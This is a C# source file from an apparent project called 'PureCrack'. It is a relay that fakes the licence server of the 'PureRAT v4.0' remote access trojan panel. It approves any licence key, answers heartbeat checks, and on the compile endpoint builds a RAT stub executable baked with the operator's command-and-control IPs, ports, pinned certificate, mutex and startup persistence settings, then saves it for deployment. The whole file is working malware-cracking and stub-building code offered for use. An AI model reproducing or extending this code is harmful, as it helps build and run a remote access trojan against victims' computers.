using System;
using System.Collections.Generic;
using PureCrack.Build;
using PureCrack.Crypto;
using PureCrack.Util;
using PureCrack.Wire;

namespace PureCrack.Relay;

/// <summary>
/// Per-endpoint handlers that take the decrypted request plaintext (or null
/// if it didn't decrypt) and return the protobuf body to wrap as a response.
///
/// All four endpoints the panel speaks:
///   /api/licence/validate          any-key OK
///   /api/licence/compile           build a stub from the panel's request body
///   /api/licence/heartbeat         minimal {f1=1} ACK
///   /api/licence/update-plugins    minimal {f1=1} ACK
/// </summary>
public sealed class RouteHandlers
{
    /// <summary>
    /// Pre-baked validate response. Built once at relay startup so we're not
    /// re-encoding ten constant fields on every request.
    /// </summary>
    public byte[] ValidatePb { get; }

    private readonly byte[] _cannedCompile;

    public RouteHandlers(byte[] agentPfxBytes, byte[] cannedCompileResponse)
    {
        ValidatePb = BuildValidateResponse(agentPfxBytes);
        _cannedCompile = cannedCompileResponse;
    }

    // ============================================================================
    // /validate — any-key OK
    // ============================================================================

    private static byte[] BuildValidateResponse(byte[] agentPfxBytes)
    {
        var pfxB64 = Convert.ToBase64String(agentPfxBytes);

        // Field 7 inside field 10 wraps the PFX as { F2 = pfx_b64 }.
        var certWrapper = ProtoNet.FSub(7, ProtoNet.FString(2, pfxB64));

        var inner = Concat(
            ProtoNet.FInt   (1,  1),
            ProtoNet.FString(2,  ""),
            ProtoNet.FString(3,  ""),
            ProtoNet.FString(5,  ""),
            ProtoNet.FString(7,  "PureRAT v4.0 - any-key mode"),
            ProtoNet.FString(9,  "Welcome!"),
            ProtoNet.FSub   (10, certWrapper),
            ProtoNet.FString(11, "HWID Changes: 1 of 9999 used"),
            ProtoNet.FString(12, ""),
            ProtoNet.FString(13, "Expires in 9999 days"));

        return ProtoNet.FSub(2, inner);
    }

    // ============================================================================
    // /compile — dynamic build, falls back to canned if anything goes sideways
    // ============================================================================

    public byte[] Compile(byte[]? plaintext, bool dynamicBuildEnabled)
    {
        if (plaintext != null && dynamicBuildEnabled)
        {
            try
            {
                var dyn = BuildDynamic(plaintext);
                if (dyn != null) return dyn;
            }
            catch (Exception ex)
            {
                Log.Err($"dyn-build failed: {ex.Message}");
            }
            Log.Warn("falling back to canned /compile response");
        }
        return _cannedCompile;
    }

    private static byte[]? BuildDynamic(byte[] plaintext)
    {
        var settings = ExtractBuildSettings(plaintext);
        if (settings.Ips.Count == 0 || settings.Ports.Count == 0)
        {
            Log.Warn("dyn-build: panel did not include IPs/Ports — using canned");
            return null;
        }

        // Prefer the panel's PFX bytes (F10) over its DER cert (F3) — PFX is
        // what SslStream pins against, and the relay-built stub bakes whatever
        // we put here straight into its RemoteCertificateValidationCallback.
        var certB64 = !string.IsNullOrEmpty(settings.PanelPfxBase64)
            ? settings.PanelPfxBase64
            : settings.CertBase64;

        var cfg = new BuildConfig
        {
            Ips           = settings.Ips,
            Ports         = settings.Ports,
            CertPfxBase64 = certB64 ?? "",
            Group         = settings.Group ?? "Default",
            Mutex         = settings.Mutex ?? "purecrack-default",
            StartupName   = settings.StartupName ?? "",
            StartupEnv    = settings.StartupEnv ?? "",
        };

        Log.Info($"dyn-build: ips=[{string.Join(",", cfg.Ips)}] " +
                 $"ports=[{string.Join(",", cfg.Ports)}] group={cfg.Group} mutex={cfg.Mutex}");

        var pe = StubBuilder.Build(cfg);

        DiskGuard.WarnIfLow();

        // Persist to runs/stubs/ so the operator can grab it after the panel
        // hands it off. Naming includes timestamp + first 8 of group hash for
        // disambiguation when the operator hits Build many times in a row.
        var stamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
        var stubPath = System.IO.Path.Combine(Workspace.StubsDir,
            $"stub_{stamp}_{System.Diagnostics.Process.GetCurrentProcess().Id}.exe");
        System.IO.File.WriteAllBytes(stubPath, pe);
        Log.Ok($"dyn-build: wrote {pe.Length:N0}b stub to {stubPath}");

        // Wire-shape the panel needs: 5-field inner inside F4. Three-field
        // inners get rejected with "Error Build" — we discovered this the
        // hard way during the Python-kit phase; documented in WIRE_FORMAT.md.
        var inner = Concat(
            ProtoNet.FInt   (1, 1),
            ProtoNet.FString(2, ""),
            ProtoNet.FBytes (3, pe),
            ProtoNet.FString(5, ""),
            ProtoNet.FInt   (6, 1));
        return ProtoNet.FSub(4, inner);
    }

    /// <summary>
    /// Walks the decrypted /compile request body to pull out the build config.
    /// Path through the protobuf tree (matches the Python kit one-for-one):
    ///   outer.F3 (bytes) → parse → F5 (bytes) → parse → F9 (bytes) → parse
    ///   then read fields off the deepest message:
    ///     F1 ips, F2 ports, F3 cert_b64, F4 group, F10 panel_pfx_b64,
    ///     F11 startup_name, F12 startup_env, F14 mutex
    /// </summary>
    private static BuildSettings ExtractBuildSettings(byte[] plaintext)
    {
        var empty = new BuildSettings();
        try
        {
            var outer = ProtoNet.Parse(plaintext);
            var bodyBytes = ProtoNet.FirstSub(outer, 3);
            if (bodyBytes == null) return empty;

            var settingsMsg = ProtoNet.FirstSub(ProtoNet.Parse(bodyBytes), 5);
            if (settingsMsg == null) return empty;

            var cls3Body = ProtoNet.FirstSub(ProtoNet.Parse(settingsMsg), 9);
            if (cls3Body == null) return empty;

            var cf = ProtoNet.Parse(cls3Body);
            return new BuildSettings
            {
                Ips             = ProtoNet.GetStrings(cf, 1),
                Ports           = ConvertToInts(ProtoNet.GetInts(cf, 2)),
                CertBase64      = ProtoNet.FirstString(cf, 3),
                Group           = ProtoNet.FirstString(cf, 4, "Default"),
                PanelPfxBase64  = ProtoNet.FirstString(cf, 10),
                StartupName     = ProtoNet.FirstString(cf, 11),
                StartupEnv      = ProtoNet.FirstString(cf, 12),
                Mutex           = ProtoNet.FirstString(cf, 14, "purecrack-default"),
            };
        }
        catch (Exception ex)
        {
            Log.Warn($"extract: parse err: {ex.Message}");
            return empty;
        }
    }

    private static List<int> ConvertToInts(List<long> longs)
    {
        var output = new List<int>(longs.Count);
        foreach (var l in longs) output.Add((int)l);
        return output;
    }

    private sealed class BuildSettings
    {
        public List<string> Ips { get; init; } = new();
        public List<int>    Ports { get; init; } = new();
        public string?      CertBase64 { get; init; }
        public string?      Group { get; init; }
        public string?      PanelPfxBase64 { get; init; }
        public string?      StartupName { get; init; }
        public string?      StartupEnv { get; init; }
        public string?      Mutex { get; init; }
    }

    // ============================================================================
    // /heartbeat + /update-plugins — minimal ACK
    // ============================================================================

    /// <summary>The trivial {F2: {F1: 1}} message both endpoints expect.</summary>
    public static byte[] AckResponse() => ProtoNet.FSub(2, ProtoNet.FInt(1, 1));

    // ============================================================================
    // Helpers
    // ============================================================================

    private static byte[] Concat(params byte[][] chunks)
    {
        var total = 0;
        foreach (var c in chunks) total += c.Length;
        var output = new byte[total];
        var off = 0;
        foreach (var c in chunks)
        {
            Buffer.BlockCopy(c, 0, output, off, c.Length);
            off += c.Length;
        }
        return output;
    }
}
